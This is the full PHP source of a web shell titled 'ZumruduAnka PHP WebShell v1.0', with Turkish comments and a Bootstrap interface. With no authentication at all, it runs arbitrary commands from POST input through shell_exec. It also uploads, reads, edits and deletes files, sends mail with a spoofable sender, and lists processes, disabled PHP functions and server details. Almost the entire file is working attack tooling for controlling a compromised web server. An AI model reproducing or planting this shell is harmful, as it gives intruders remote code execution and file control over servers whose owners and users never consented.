<?php
// Güvenlik uyarısı: Bu script, komut çalıştırma yeteneğine sahiptir.
// Bu nedenle, yalnızca güvendiğiniz kaynaklarla paylaşın ve sunucunuzda uygun güvenlik önlemleri alın.

function run_command($command)
{
    $output = shell_exec($command);
    echo "<pre>" . htmlspecialchars($output) . "</pre>";
}

function format_permissions($perms)
{
    $info = '';
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');
    return $info;
}


// Mail gönderme işlemi
if (isset($_POST['email_from']) && isset($_POST['email_to']) && isset($_POST['email_subject']) && isset($_POST['email_body'])) {
    $email_from = $_POST['email_from'];
    $email_to = $_POST['email_to'];
    $email_subject = $_POST['email_subject'];
    $email_body = $_POST['email_body'];
    $email_headers = "From: " . $email_from . "\r\n" .
        "Content-Type: text/plain; charset=UTF-8" . "\r\n";

    if (mail($email_to, $email_subject, $email_body, $email_headers)) {
        echo "E-posta başarıyla gönderildi.";
    } else {
        echo "E-posta gönderilemedi.";
    }
    exit;
}

// Dosyaları listeleyen fonksiyon
function list_files($directory, $search = '')
{
    $files = array_diff(scandir($directory), array('.', '..'));
    echo "<table class='table'>";
    echo "<thead><tr><th>Filename</th><th>Permissions</th><th>File Operations</th></tr></thead>";
    echo "<tbody>";
    foreach ($files as $file) {
        if ($search !== '' && strpos($file, $search) === false) {
            continue;
        }
        echo "<tr>";
        echo "<td>" . htmlspecialchars($file) . "</td>";
        echo "<td>" . format_permissions(fileperms($file)) . "</td>";
        echo "<td><button data-file='" . urlencode($file) . "' class='btn btn-sm btn-primary editBtn'>Edit</button> <a href='?delete=" . urlencode($file) . "' class='btn btn-sm btn-danger'>Delete</a></td>";
        echo "</tr>";
    }
    echo "</tbody>";
    echo "</table>";
}

// Dosya silme işlemi
if (isset($_GET['delete']) && !empty($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file)) {
        unlink($file);
    }
}

// Dosya düzenleme işlemi
if (isset($_GET['edit']) && !empty($_GET['edit'])) {
    $file = $_GET['edit'];
    if (file_exists($file)) {
        echo file_get_contents($file);
        exit;
    }
}

// Komut çalıştırma işlemi
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = $_POST['command'];
    run_command($command);
    exit;
}

// Dosya düzenleme kaydetme işlemi
if (isset($_POST['file']) && !empty($_POST['file']) && isset($_POST['content'])) {
    $file = $_POST['file'];
    file_put_contents($file, $_POST['content']);
    exit;
}

// Dosya arama işlemi
if (isset($_POST['search']) && !empty($_POST['search'])) {
    ob_start();
    list_files(__DIR__, $_POST['search']);
    $search_result = ob_get_clean();
    echo $search_result ? $search_result : "The file you are looking for was not found.";
    exit;
}

// Dosya yükleme işlemi
if (isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $upload_directory = __DIR__;
    $upload_path = $upload_directory . '/' . basename($file['name']);

    if (move_uploaded_file($file['tmp_name'], $upload_path)) {
        echo "File uploaded successfully.";
    } else {
        echo "There was an error uploading the file!";
    }
    exit;
}

// Disk alanı ve saat bilgisi
function get_disk_space_info()
{
    $free_space = disk_free_space(__DIR__);
    $total_space = disk_total_space(__DIR__);
    $used_space = $total_space - $free_space;
    $free_space_percent = ($free_space / $total_space) * 100;
    $used_space_percent = ($used_space / $total_space) * 100;

    return array(
        'free_space' => $free_space,
        'total_space' => $total_space,
        'used_space' => $used_space,
        'free_space_percent' => $free_space_percent,
        'used_space_percent' => $used_space_percent,
    );
}

// PHP disabled_functions bilgisi
function get_disabled_functions()
{
    $disabled_functions = ini_get('disable_functions');
    if (empty($disabled_functions)) {
        return "All functions are open.";
    }
    return $disabled_functions;
}

// Sistem kullanıcısı ve çalışma dizini bilgisi
function get_system_user_and_directory()
{
    $user = get_current_user();
    $directory = getcwd();
    return array(
        'user' => $user,
        'directory' => $directory,
    );
}

// Dosyaları listeleyin
ob_start();
echo "<h2>Files:</h2>";
list_files(__DIR__);

$content = ob_get_clean();

// Disk alanı ve saat bilgisi
$disk_info = get_disk_space_info();
$current_time = date('Y-m-d H:i:s');
$system_user_and_directory = get_system_user_and_directory();

?>

<!DOCTYPE html>
<html>
<head>
    <title>ZumruduAnka Web Shell v1.0</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        .container {
            max-width: 100%;
        }
        #commandOutput {
            background-color: #f0f0f0;
            padding: 10px;
            border-radius: 5px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="my-4">ZumruduAnka PHP WebShell v1.0</h1>
        <div class="row">
            <div class="col-md-12">
                <div class="d-flex mb-4">
                    <button class="btn btn-primary me-2" type="button" data-bs-toggle="collapse" data-bs-target="#commandCollapse" data-bs-parent="#accordion">Command Execute</button>
                    <button class="btn btn-primary me-2" type="button" data-bs-toggle="collapse" data-bs-target="#systemInfoCollapse" data-bs-parent="#accordion">System Information</button>
                    <button class="btn btn-primary me-2" type="button" data-bs-toggle="collapse" data-bs-target="#processListCollapse" data-bs-parent="#accordion">Running Process</button>
                    <button class="btn btn-primary me-2" type="button" data-bs-toggle="collapse" data-bs-target="#searchCollapse" data-bs-parent="#accordion">File Search</button>
                    <button class="btn btn-primary me-2" type="button" data-bs-toggle="collapse" data-bs-target="#uploadCollapse" data-bs-parent="#accordion">File Upload</button>
		    <button class="btn btn-primary" type="button" data-bs-toggle="collapse" data-bs-target="#emailCollapse" data-bs-parent="#accordion">Send Mail</button>
                </div>

   
    <div class="accordion" id="accordion">
        <!-- Mevcut menüler ve içerikler -->

       <!-- Mail Gönderme Formu -->
        <div class="collapse mb-2" id="emailCollapse">
            <div class="card card-body">
                <form id="emailForm" method="post">
                    <div class="mb-3">
                        <label for="email_from" class="form-label">From:</label>
                        <input type="email" name="email_from" class="form-control" id="email_from" required>
                    </div>
                    <div class="mb-3">
                        <label for="email_to" class="form-label">To:</label>
                        <input type="email" name="email_to" class="form-control" id="email_to" required>
                    </div>
                    <div class="mb-3">
                        <label for="email_subject" class="form-label">Subject:</label>
                        <input type="text" name="email_subject" class="form-control" id="email_subject" required>
                    </div>
                    <div class="mb-3">
                        <label for="email_body" class="form-label">Message:</label>
                        <textarea name="email_body" class="form-control" id="email_body" rows="5" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Send</button>
                </form>
            </div>
        </div>

                <div class="accordion" id="accordion">
                    <div class="collapse mb-2" id="commandCollapse">
                        <div class="card card-body">
                            <form id="commandForm" method="post">
                                <div class="input-group mb-3">
                                    <input type="text" name="command" class="form-control">
                                    <input type="submit" value="Execute" class="btn btn-primary">
                                </div>
                            </form>
                            <div id="commandOutput"></div>
                        </div>
                    </div>



                    <div class="collapse mb-2" id="systemInfoCollapse">
                        <div class="card card-body">
                            <?php
                            echo "IP Address: " . $_SERVER['SERVER_ADDR'] . "<br>";
                            echo "Webserver: " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
                            echo "PHP Version: " . phpversion() . "<br>";
                            echo "System User: " . $system_user_and_directory['user'] . "<br>";
                            echo "Working Dir: " . $system_user_and_directory['directory'] . "<br>";
                            echo "Disk Usage: " . round($disk_info['used_space'] / (1024 * 1024), 2) . " MB / " . round($disk_info['total_space'] / (1024 * 1024), 2) . " MB<br>";
                            echo "Time: " . $current_time . "<br>";
                            echo "Disabled PHP Functions: " . get_disabled_functions() . "<br>";
                            ?>
                        </div>
                    </div>
                    <div class="collapse mb-2" id="processListCollapse">
                        <div class="card card-body">
                            <?php
                            if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
                                run_command('tasklist');
                            } else {
                                run_command('ps aux');
                            }
                            ?>
                        </div>
                    </div>
                    <div class="collapse mb-2" id="searchCollapse">
                        <div class="card card-body">
                            <form id="searchForm" method="post">
                                <div class="input-group mb-3">
                                    <input type="text" name="search" class="form-control" placeholder="Enter file name">
                                    <input type="submit" value="Search" class="btn btn-primary">
                                </div>
                            </form>
                            <div id="searchResult"></div>
                        </div>
                    </div>
                    <div class="collapse mb-2" id="uploadCollapse">
                        <div class="card card-body">
                            <form id="uploadForm" method="post" enctype="multipart/form-data">
                                <div class="input-group mb-3">
                                    <input type="file" name="file" class="form-control">
                                    <input type="submit" value="Upload" class="btn btn-primary">
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
                <div id="fileList">
                    <?php echo $content; ?>
                </div>
            </div>
        </div>
    </div>
    <!-- Dosya düzenleme modalı -->
    <div class="modal" tabindex="-1" id="editModal">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Edit</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <form id="editForm" method="post">
                        <input type="hidden" name="file" id="editFile">
                        <div class="form-group">
                            <textarea name="content" id="editContent" class="form-control" rows="10"></textarea>
                        </div>
                    </form>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
                    <button type="button" class="btn btn-success" id="saveEdit">Save Changes</button>
                </div>
            </div>
        </div>
    </div>


    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.0/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        $(document).ready(function () {
            // Komut formu işleme
            $("#commandForm").on("submit", function (e) {
                e.preventDefault();
                $.post("", $(this).serialize(), function (data) {
                    $("#commandOutput").html(data);
                });
            });

            // Dosya arama işlemi
            $("#searchForm").on("submit", function (e) {
                e.preventDefault();
                $.post("", $(this).serialize(), function (data) {
                    $("#searchResult").html(data);
                });
            });

            // Dosya düzenleme butonları işleme
            $(".editBtn").on("click", function () {
                var file = $(this).data("file");
                $("#editFile").val(file);
                $.get("?edit=" + file, function (content) {
                    $("#editContent").val(content);
                    $("#editModal").modal("show");
                });
            });

            // Dosya düzenleme kaydetme işlemi
            $("#saveEdit").on("click", function () {
                $.post("", $("#editForm").serialize(), function () {
                    location.reload();
                });
            });

            // Menülerin açılırken diğer açık menülerin kapanması
            $(".accordion").on("show.bs.collapse", function () {
                $(".collapse.show").collapse("hide");
            });

            // Dosya yükleme işlemi
            $("#uploadForm").on("submit", function (e) {
                e.preventDefault();
                var formData = new FormData(this);
                $.ajax({
                    url: "",
                    type: "POST",
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function (data) {
                        alert("File uploaded successfully.");
                        location.reload();
                    },
                    error: function (jqXHR, textStatus, errorThrown) {
                        alert("File upload error: " + textStatus + " " + errorThrown);
                    }
                });
            });
        });
    </script>
</body>

</html>
